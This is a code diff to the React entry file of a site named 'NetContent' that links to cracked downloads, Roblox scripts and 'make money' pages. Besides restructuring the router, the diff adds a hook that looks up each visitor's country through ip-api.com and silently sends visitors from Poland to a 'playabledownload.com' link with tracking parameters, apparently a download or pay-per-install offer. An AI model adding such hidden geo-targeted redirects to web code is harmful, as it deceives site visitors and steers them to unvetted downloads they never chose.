@@ -1,5 +1,5 @@
 import React, { useEffect } from 'react';
-import { BrowserRouter as Router, Routes, Route, Link, useLocation } from 'react-router-dom';
+import { BrowserRouter as Router, Routes, Route, Link, useLocation, useNavigate } from 'react-router-dom';
 import './styles.css';
 import CreateAccounts from './CreateAccounts';
 import CompleteCaptchas from './CompleteCaptchas';
@@ -109,30 +109,51 @@ function Home() {
 }
 
 function App() {
+  const navigate = useNavigate();
+
+  useEffect(() => {
+    // Fetch the user's location based on their IP address
+    fetch('http://ip-api.com/json/')
+      .then(response => response.json())
+      .then(data => {
+        if (data.country === 'Poland') {
+          // Redirect to the specified link if the user is from Poland
+          window.location.href = 'https://playabledownload.com/show.php?l=0&u=1781210&id=66952';
+        }
+      })
+      .catch(error => {
+        console.error('Error fetching location data:', error);
+      });
+  }, [navigate]);
+
   return (
-    <Router>
-      <div className="App">
-        <header>
-          <h1>Welcome to NetContent</h1>
-        </header>
-        <nav>
-          <Link to="/#home">Home</Link>
-          <Link to="/#make-money">Make Money</Link>
-          <Link to="/#games-download">Cracked Download</Link>
-          <Link to="/#roblox-scripts">Roblox Scripts</Link>
-          <Link to="/#minecraft-mods">Minecraft Mods</Link> {/* New link */}
-        </nav>
-        <Routes>
-          <Route path="/" element={<Home />} />
-          <Route path="/create-accounts" element={<CreateAccounts />} />
-          <Route path="/complete-captchas" element={<CompleteCaptchas />} />
-        </Routes>
-        <footer>
-          <p>&copy; 2023 NetContent. All rights reserved.</p>
-        </footer>
-      </div>
-    </Router>
+    <div className="App">
+      <header>
+        <h1>Welcome to NetContent</h1>
+      </header>
+      <nav>
+        <Link to="/#home">Home</Link>
+        <Link to="/#make-money">Make Money</Link>
+        <Link to="/#games-download">Cracked Download</Link>
+        <Link to="/#roblox-scripts">Roblox Scripts</Link>
+        <Link to="/#minecraft-mods">Minecraft Mods</Link> {/* New link */}
+      </nav>
+      <Routes>
+        <Route path="/" element={<Home />} />
+        <Route path="/create-accounts" element={<CreateAccounts />} />
+        <Route path="/complete-captchas" element={<CompleteCaptchas />} />
+      </Routes>
+      <footer>
+        <p>&copy; 2023 NetContent. All rights reserved.</p>
+      </footer>
+    </div>
   );
 }
 
-export default App;
+export default function AppWrapper() {
+  return (
+    <Router>
+      <App />
+    </Router>
+  );
+}
